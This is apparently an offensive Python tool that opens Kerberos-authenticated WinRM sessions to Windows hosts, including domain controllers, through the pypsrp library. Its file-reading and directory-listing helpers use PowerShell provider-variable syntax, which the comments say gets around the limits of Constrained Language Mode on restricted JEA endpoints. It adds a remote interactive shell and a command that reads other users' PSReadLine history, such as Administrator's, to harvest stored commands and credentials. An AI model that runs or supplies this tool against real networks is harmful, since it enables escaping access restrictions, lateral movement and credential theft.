import os
import sys

from pypsrp.wsman import WSMan
from pypsrp.powershell import RunspacePool, PowerShell


# ── core helpers ──────────────────────────────────────────────────────────────


def make_wsman(host: str, ccache: str, krb5: str, port: int, ssl: bool) -> WSMan:
    os.environ["KRB5CCNAME"] = ccache
    os.environ["KRB5_CONFIG"] = krb5
    return WSMan(
        host,
        auth="kerberos",
        ssl=ssl,
        port=port,
        negotiate_service="HTTP",
        negotiate_hostname_override=host,
    )


def pool_kwargs(endpoint: str) -> dict:
    return {"configuration_name": endpoint} if endpoint else {}


def run_ps(pool, script: str) -> list:
    ps = PowerShell(pool)
    ps.add_script(script)
    output = ps.invoke()
    if ps.had_errors:
        for err in ps.streams.error:
            print(f"[!] {err}", file=sys.stderr)
    return output


def print_output(output):
    if output:
        for line in output:
            print(line)
    else:
        print("[-] No output")


# ── PS script builders (JEA/CLM-aware) ───────────────────────────────────────


def _read_script(path: str, jea: bool) -> str:
    if jea:
        # CLM blocks cmdlets and .NET method calls.
        # PS variable-provider syntax ${C:\path} reads file content via the
        # FileSystem provider at the language level — survives CLM.
        return "${" + path + "}"
    return f"Get-Content '{path}'"


def _ls_script(path: str, jea: bool) -> str:
    if jea:
        # Same trick: provider variable syntax for directory listing.
        return "${" + path + "}"
    return (
        f"Get-ChildItem '{path}' -Force"
        f" | Select-Object Mode,LastWriteTime,Length,Name"
        f" | Format-Table -AutoSize | Out-String"
    )


# ── commands ──────────────────────────────────────────────────────────────────


def cmd_whoami(wsman, endpoint):
    with RunspacePool(wsman, **pool_kwargs(endpoint)) as pool:
        out = run_ps(pool, "$env:USERDOMAIN + '\\' + $env:USERNAME")
        print("[+] Running as:", end=" ")
        print_output(out)


def cmd_jea_commands(wsman, endpoint):
    if not endpoint:
        print("[!] --jea-commands requires --endpoint", file=sys.stderr)
        sys.exit(1)
    with RunspacePool(wsman, **pool_kwargs(endpoint)) as pool:
        ps = PowerShell(pool)
        ps.add_cmdlet("Get-Command")
        output = ps.invoke()
        print("[+] Available commands:")
        for item in output:
            print(f"    {item}")


def cmd_exec(wsman, endpoint, script):
    with RunspacePool(wsman, **pool_kwargs(endpoint)) as pool:
        out = run_ps(pool, script)
        print_output(out)


def cmd_history(wsman, endpoint, users):
    jea = bool(endpoint)
    with RunspacePool(wsman, **pool_kwargs(endpoint)) as pool:
        for user in users:
            path = (
                rf"C:\Users\{user}\AppData\Roaming\Microsoft"
                rf"\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
            )
            print(f"\n[*] History for {user}:")
            out = run_ps(pool, _read_script(path, jea))
            print_output(out)


def cmd_read(wsman, endpoint, path):
    jea = bool(endpoint)
    with RunspacePool(wsman, **pool_kwargs(endpoint)) as pool:
        print(f"[*] Reading: {path}")
        out = run_ps(pool, _read_script(path, jea))
        print_output(out)


def cmd_ls(wsman, endpoint, path):
    jea = bool(endpoint)
    with RunspacePool(wsman, **pool_kwargs(endpoint)) as pool:
        out = run_ps(pool, _ls_script(path, jea))
        print_output(out)


def cmd_shell(wsman, endpoint, host):
    label = f"[JEA:{host}]" if endpoint else f"[PS:{host}]"
    print(f"[+] Entering interactive shell — {label}")
    print("[*] Type 'exit' to quit\n")
    with RunspacePool(wsman, **pool_kwargs(endpoint)) as pool:
        while True:
            try:
                cmd = input(f"{label} PS> ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\n[*] Exiting shell.")
                break
            if cmd.lower() in ("exit", "quit"):
                break
            if not cmd:
                continue
            out = run_ps(pool, cmd)
            print_output(out)


# ── main ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description="Kerberos WinRM shell — JEA-aware, CLM-compatible",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  # full PS session
  %(prog)s --host dc1.corp.local --ccache admin.ccache --whoami
  %(prog)s --host dc1.corp.local --ccache admin.ccache --shell

  # JEA restricted endpoint (CLM-safe file reading included)
  %(prog)s --host dc1.corp.local --ccache svc.ccache --endpoint restricted --jea-commands
  %(prog)s --host dc1.corp.local --ccache svc.ccache --endpoint restricted --shell
  %(prog)s --host dc1.corp.local --ccache svc.ccache --endpoint restricted --read 'C:\\secret.txt'
  %(prog)s --host dc1.corp.local --ccache svc.ccache --endpoint restricted --history Administrator

  # custom krb5.conf / HTTPS
  %(prog)s --host srv.corp.local --ccache user.ccache --krb5 /tmp/corp.conf --ssl --whoami
        """,
    )

    conn = parser.add_argument_group("connection")
    conn.add_argument("--host", required=True, help="Target hostname or IP")
    conn.add_argument("--ccache", required=True, help="Kerberos ccache file")
    conn.add_argument(
        "--krb5",
        default="/etc/krb5.conf",
        metavar="PATH",
        help="krb5.conf to use (default: /etc/krb5.conf)",
    )
    conn.add_argument(
        "--endpoint",
        default=None,
        metavar="NAME",
        help="JEA configuration name (omit for unrestricted PowerShell)",
    )
    conn.add_argument(
        "--port", type=int, default=5985, help="WinRM port (default: 5985)"
    )
    conn.add_argument(
        "--ssl", action="store_true", help="Use HTTPS (auto-switches to 5986)"
    )

    act = parser.add_argument_group("actions")
    act.add_argument("--whoami", action="store_true", help="Show current identity")
    act.add_argument(
        "--jea-commands", action="store_true", help="List commands in JEA endpoint"
    )
    act.add_argument("--exec", metavar="SCRIPT", help="Run a single PowerShell script")
    act.add_argument(
        "--history", nargs="+", metavar="USER", help="Read PSReadLine history for users"
    )
    act.add_argument("--read", metavar="PATH", help="Read a remote file")
    act.add_argument("--ls", metavar="PATH", help="List a remote directory")
    act.add_argument("--shell", action="store_true", help="Interactive pseudo-shell")

    args = parser.parse_args()

    port = args.port
    if args.ssl and port == 5985:
        port = 5986

    wsman = make_wsman(args.host, args.ccache, args.krb5, port, args.ssl)

    if args.whoami:
        cmd_whoami(wsman, args.endpoint)
    elif args.jea_commands:
        cmd_jea_commands(wsman, args.endpoint)
    elif args.exec:
        cmd_exec(wsman, args.endpoint, args.exec)
    elif args.history:
        cmd_history(wsman, args.endpoint, args.history)
    elif args.read:
        cmd_read(wsman, args.endpoint, args.read)
    elif args.ls:
        cmd_ls(wsman, args.endpoint, args.ls)
    elif args.shell:
        cmd_shell(wsman, args.endpoint, args.host)
    else:
        parser.print_help()
